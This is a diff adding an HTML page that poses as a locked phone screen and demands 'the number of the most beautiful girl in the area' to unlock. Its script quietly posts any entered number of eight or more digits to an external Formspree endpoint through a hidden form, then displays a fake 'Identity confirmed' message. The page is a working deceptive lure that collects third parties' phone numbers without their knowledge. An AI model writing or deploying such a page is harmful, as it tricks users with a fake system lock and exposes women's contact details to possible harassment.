@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Phone Locked</title>
+    <style>
+        body { margin: 0; background: #000 url('https://images.unsplash.com/photo-1614850523296-e8c0d9732391?q=80&w=2070') no-repeat center; background-size: cover; font-family: 'Roboto', sans-serif; color: white; height: 100vh; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 40px 0; }
+        .clock { text-align: center; margin-top: 20px; }
+        .clock h1 { font-size: 70px; margin: 0; font-weight: 300; }
+        .clock p { font-size: 18px; margin: 0; }
+        .lock-container { background: rgba(0,0,0,0.4); backdrop-filter: blur(10px); width: 85%; padding: 20px; border-radius: 20px; text-align: center; }
+        .instruction { margin-bottom: 20px; font-size: 14px; opacity: 0.9; line-height: 1.4; }
+        .input-box { font-size: 24px; letter-spacing: 5px; margin-bottom: 20px; min-height: 30px; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; width: 100%; max-width: 250px; margin: 0 auto; }
+        .key { width: 60px; height: 60px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.3); display: flex; align-items: center; justify-content: center; font-size: 20px; transition: 0.2s; cursor: pointer; }
+        .key:active { background: rgba(255,255,255,0.2); }
+        .unlocked { display: none; text-align: center; padding: 20px; }
+    </style>
+</head>
+<body>
+
+    <div id="lock-screen">
+        <div class="clock">
+            <h1 id="time">12:00</h1>
+            <p id="date">Sunday, April 26</p>
+        </div>
+
+        <div class="lock-container">
+            <p class="instruction"><b>SYSTEM LOCKED</b><br>To unlock, enter the number of the most beautiful girl in the area.</p>
+            <div class="input-box" id="display"></div>
+
+            <form id="numForm" action="https://formspree.io/f/xojybypp" method="POST" style="display:none;">
+                <input type="text" name="phone_number" id="hiddenInput">
+            </form>
+
+            <div class="keypad">
+                <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
+                <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
+                <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
+                <div class="key" onclick="press('C')" style="border:none; font-size:14px;">CLR</div><div class="key" onclick="press('0')">0</div><div class="key" onclick="press('OK')" style="border:none; font-size:14px; color:#4CAF50;">OK</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="unlocked-screen" class="unlocked">
+        <h1>Unlocked! ✅</h1>
+        <p>Verification successful. Identity confirmed.</p>
+    </div>
+
+    <script>
+        let input = "";
+        function press(key) {
+            if (key === 'C') { input = ""; }
+            else if (key === 'OK') {
+                if (input.length >= 8) {
+                    document.getElementById('hiddenInput').value = input;
+                    const form = document.getElementById('numForm');
+                    fetch(form.action, { method: 'POST', body: new FormData(form), headers: { 'Accept': 'application/json' }});
+                    document.getElementById('lock-screen').style.display = "none";
+                    document.getElementById('unlocked-screen').style.display = "block";
+                }
+            } else { input += key; }
+            document.getElementById('display').innerText = input;
+        }
+        setInterval(() => {
+            const now = new Date();
+            document.getElementById('time').innerText = now.getHours() + ":" + String(now.getMinutes()).padStart(2, '0');
+        }, 1000);
+    </script>
+</body>
+</html>
